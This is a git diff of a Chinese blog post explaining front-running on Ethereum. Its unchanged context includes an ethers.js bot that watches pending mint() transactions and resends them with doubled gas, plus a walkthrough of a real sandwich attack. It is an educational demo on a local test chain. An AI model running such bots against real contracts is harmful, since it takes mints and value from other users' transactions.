@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
 <meta property="article:published_time" content="2023-01-17T14:12:01.000Z">
-<meta property="article:modified_time" content="2023-01-17T16:55:00.689Z">
+<meta property="article:modified_time" content="2023-01-18T06:02:53.199Z">
 <meta property="article:author" content="Banana69">
 <meta property="article:tag" content="智能合约">
 <meta name="twitter:card" content="summary">
@@ -54,7 +54,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2023-01-18 00:55:00'
+  postUpdate: '2023-01-18 14:02:53'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -152,24 +152,24 @@
 <li><p>启动 Foundry 本地测试链</p>
 <p><code>anvil --chain-id 1234 -b 10</code></p>
 <p>Chain id 为 1234 并且在每 10 秒产出一个区块。</p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117222113559.png" alt="image-20230117222113559"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117222113559.png" alt="image-20230117222113559"></p>
 <p>测试合约：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@oppenzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FreeMint is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721(&quot;FREE MINT NFT&quot;,&quot;FREEMINT&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    //铸造函数</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        _mint(msg.sender, totalSupply);</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>在 remix 中部署合约</p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117225843870.png" alt="image-20230117225843870"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117225843870.png" alt="image-20230117225843870"></p>
 </li>
 <li><p>部署 etherJs 抢跑脚本，在该脚本中监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers, utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.WebSocketProvider(<span class="string">&quot;http://127.0.0.1:8545&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> network = provider.getNetwork()</span><br><span class="line">network.then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 连接到 chain ID <span class="subst">$&#123;res.chainId&#125;</span>`</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 interface 对象，用于解码交易详情</span></span><br><span class="line"><span class="keyword">const</span> iface = <span class="keyword">new</span> utils.Interface([</span><br><span class="line">    <span class="string">&quot;function mint() external&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建钱包，用于发送抢跑交易</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&quot;0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6&quot;</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.Wallet(privateKey, provider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> main = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">//监听pending的mint交易，获取交易详情并解码</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;\n. 监听pending交易，获取txHash，并输出交易详情。&quot;</span>)</span><br><span class="line">    provider.on(<span class="string">&quot;pending&quot;</span>, <span class="keyword">async</span> (txHash) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> tx = <span class="keyword">await</span> provider.getTransaction(txHash)</span><br><span class="line">        <span class="keyword">if</span> (txHash) &#123;</span><br><span class="line">            <span class="comment">//监听交易池中未打包的交易，过滤 pending.data</span></span><br><span class="line">            <span class="keyword">if</span> (tx.data.indexOf(iface.getSighash(<span class="string">&quot;mint&quot;</span>)) != -<span class="number">1</span> &amp;&amp; tx.from != wallet.address) &#123;</span><br><span class="line">                <span class="comment">//打印txHash</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`\n[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 监听 Pending 交易: <span class="subst">$&#123;txHash&#125;</span> \r`</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">//打印解码的交易详情</span></span><br><span class="line">                <span class="keyword">let</span> parsedTx = iface.parseTransaction(tx)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;pending交易详情解码：&quot;</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`name: <span class="subst">$&#123;parsedTx.name&#125;</span>`</span>)</span><br><span class="line">                <span class="comment">// Input data解码</span></span><br><span class="line">                <span class="comment">// console.log(&quot;raw transaction&quot;)</span></span><br><span class="line">                <span class="comment">// console.log(tx)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//构建抢跑 tx</span></span><br><span class="line">                <span class="keyword">const</span> txFrontrun = &#123;</span><br><span class="line">                    <span class="attr">to</span>: tx.to,</span><br><span class="line">                    <span class="attr">value</span>: tx.value,</span><br><span class="line">                    <span class="attr">maxPriorityFeePerGas</span>: tx.maxPriorityFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">maxFeePerGas</span>: tx.maxFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">gasLimit</span>: tx.gasLimit * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">data</span>: tx.data</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//发送抢跑交易</span></span><br><span class="line">                <span class="keyword">var</span> txResponse = <span class="keyword">await</span> wallet.sendTransaction(txFrontrun)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`正在 frontrun 交易`</span>)</span><br><span class="line">                <span class="keyword">await</span> txResponse.wait()</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`frontrun 交易成功`</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`交易哈希为：<span class="subst">$&#123;txResponse.hash&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li>
 <li><p>调用 mint 函数，进行 NFT 铸造</p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117233952535.png" alt="image-20230117233952535"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117233952535.png" alt="image-20230117233952535"></p>
 </li>
 <li><p>脚本监听到交易并进行抢跑，在终端可以看到交易详情，在合约中可以调用<code>ownerOf()</code>函数查看 <code>tokenId</code> 为 1 的持有者是抢跑脚本中的钱包地址，则抢跑成功。</p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001807115.png" alt="image-20230118001807115"></p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001814266.png" alt="image-20230118001814266"></p>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001904634.png" alt="image-20230118001904634"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001807115.png" alt="image-20230118001807115"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001814266.png" alt="image-20230118001814266"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001904634.png" alt="image-20230118001904634"></p>
 </li>
 </ol>
-<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118002916893.png" alt="image-20230118002916893"></p>
+<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118002916893.png" alt="image-20230118002916893"></p>
 <p>如上图，两笔攻击交易中间夹着一笔正常的交易，攻击流程为</p>
 <ol>
 <li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li>
@@ -201,7 +201,7 @@
 <li><p>在手续费竞争力和收益之间取得平衡，尽可能的在与其他机器人的竞争中获胜</p>
 </li>
 </ul>
-<p><img src="%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118005055941.png" alt="image-20230118005055941"></p>
+<p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118005055941.png" alt="image-20230118005055941"></p>
 <p>我们用图表来更好的解释这一过程：</p>
 <ol>
 <li>用户在 A 点，打算投入 in_amount(user) 个 USDT 购买 ETH，这笔交易正常会把当前状态推向 B，同时用户设置了最大滑点为 B(max_slippage)；</li>
